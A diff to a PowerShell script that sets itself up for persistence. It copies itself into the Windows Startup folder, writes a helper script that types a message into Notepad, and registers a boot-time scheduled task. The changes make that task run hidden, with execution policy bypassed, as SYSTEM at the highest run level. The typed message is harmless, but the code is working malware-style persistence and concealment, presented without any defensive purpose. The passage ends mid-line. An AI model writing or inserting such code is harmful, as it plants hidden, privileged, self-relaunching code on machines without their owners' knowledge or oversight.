@@ -4,27 +4,31 @@ $selfPath = $MyInvocation.MyCommand.Path
 $scriptDestination = "$startupPath\BootScript.ps1"
 $notepadScriptPath = "$startupPath\NotepadMessage.ps1"
 
-# Copy this script to the Startup folder for persistence
+# Copy itself to the Startup folder for persistence
 Copy-Item -Path $selfPath -Destination $scriptDestination -Force
 
 # Create the Notepad Message Script
 $notepadScriptContent = @'
-Start-Process notepad
+$notepad = Start-Process -WindowStyle Hidden -PassThru notepad
 Start-Sleep -Seconds 1
 $wshell = New-Object -ComObject WScript.Shell
+$wshell.AppActivate($notepad.Id)
+Start-Sleep -Seconds 1
 $wshell.SendKeys("Hello again Old Friend")
 '@
 
 # Write the Notepad script to a file
 $notepadScriptContent | Set-Content -Path $notepadScriptPath -Encoding UTF8
 
-# Create a Scheduled Task for Persistence
+# Create a Scheduled Task for Persistence as SYSTEM
 $taskName = "PersistentBootScript"
-$taskDescription = "Ensures Notepad message runs at system boot."
-$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$notepadScriptPath`""
+$taskDescription = "Ensures Notepad message runs at system boot as SYSTEM."
+$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$notepadScriptPath`""
 $taskTrigger = New-ScheduledTaskTrigger -AtStartup
-$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-Register-ScheduledTask -TaskName $taskName -Description $taskDescription -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -User "$env:UserName" -RunLevel Highest -Force
+$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -RunOnlyIfNetworkAvailable
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
-# Run the Notepad script immediately
-Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$notepadScriptPath`""
+Register-ScheduledTask -TaskName $taskName -Description $taskDescription -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Principal $principal -Force
+
+# Run the Notepad script immediately, hidden
+Start-Process -WindowStyle Hidden powershell 
